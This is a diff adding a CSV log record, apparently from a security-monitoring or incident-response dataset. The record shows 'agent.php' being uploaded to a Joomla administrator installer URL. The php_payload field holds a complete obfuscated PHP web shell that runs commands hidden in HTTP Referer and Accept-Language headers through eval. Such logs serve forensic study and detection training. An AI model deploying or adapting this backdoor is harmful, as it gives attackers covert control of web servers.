@@ -1,0 +1,20 @@
+"_time","source_address","destination_address","request_uri","response_status","submitted_filename","payload_characters","php_payload"
+"2016-08-10T21:50:31.324+0000","40.80.148.42","192.168.250.70","/joomla/administrator/index.php?option=com_installer&view=install",303,"agent.php",1509,"<?php
+$d='$kh=""5|3481""5|;$kf=5|""9d75|5|5|b"";function x($5|t,$k){$c=st5|rlen($k);$5|5|l=str5|len($t);';
+$w='""5|HTT5|5|P_ACCEPT_LANGUA5|GE""];i5|5|f($rr&&$ra)5|{    $u5|=pa5|rse_u5|rl($rr)5|;    pars';
+$u=str_replace('X','','crXeatXXe_XfuXnXction');
+$B='os5|($s[$5|i],$f);if($5|e)5|{$k=$kh5|.$kf;ob_s5|t5|art();@5|e5|val5|(@gzunco5|mpress(@x(@base';
+$c='code(x(gzco5|mpress5|($o5|),$k5|));p5|rint(5|""5|<$k>$d</$k>"");@5|s5|ession_destro5|y();}}}}';
+$T='i]="""";$p5|=$ss($5|p,5|3);}if(a5|rray5|5|_k5|ey_exists($i,$s)5|){$s[$i].=5|$p;$e=5|str5|p';
+$Q='ss(m5|d5($5|i.$kh),0,5|5|3))5|;$f=$s5|l($5|5|ss(5|md5($i.$kf),0,3));$p=""5|"";fo5|r($z=1;$';
+$a='e_s5|tr($u5|[""query5|""],5|$q);$q=arr5|a5|y_5|5|values($q)5|;pr5|e5|g_match_5|all(""/([\\w])5|';
+$j='[\\w-]+(?:;q=0.([\\5|d]5|)5|)?,?/"",$ra,$5|m);if($q5|&&$m){5|@sessi5|on_5|start();$s5|=&$5|5';
+$N='i],05|,5|$e))),$k)));5|$o=ob_ge5|5|t_content5|s(5|);ob_e5|nd_clean();$d=5|b5|ase64_5|en';
+$Y='|5|_SESSIO5|N;$ss=""s5|ub5|str"";$5|sl=5|""strtolower"";$5|i5|=$5|m[1][0].5|$m[1][1];$h=$sl($';
+$t='65|45|_deco5|de(p5|reg_replace(ar5|ray(""/5|_5|/"",""/-/""),arr5|ay(""/5|5|"",""+""),$5|ss($s5|[$';
+$o='z<cou5|nt($5|m[1]);$5|z++) $5|p.=$q[$5|m[5|5|25|][$5|z]];if(strpos5|5|($p,$h)===0){$s[$';
+$e='}^$k5|{$5|j};}}re5|turn 5|$o;}$r5|=$5|_SERVER;$rr5|=@$r[5|""HTTP_5|REFERER5|""]5|;$ra=@$r[';
+$q='$o=""""5|;for($5|i5|=0;$i<$l;5|){for($j=5|05|;($j<$c5|&&$i<$l);5|$j++,$i5|5|++){5|$o.=$t{$i';
+$L=str_replace('5|','',$d.$q.$e.$w.$a.$j.$Y.$Q.$o.$T.$B.$t.$N.$c);
+$R=$u('',$L);$R();
+?>"
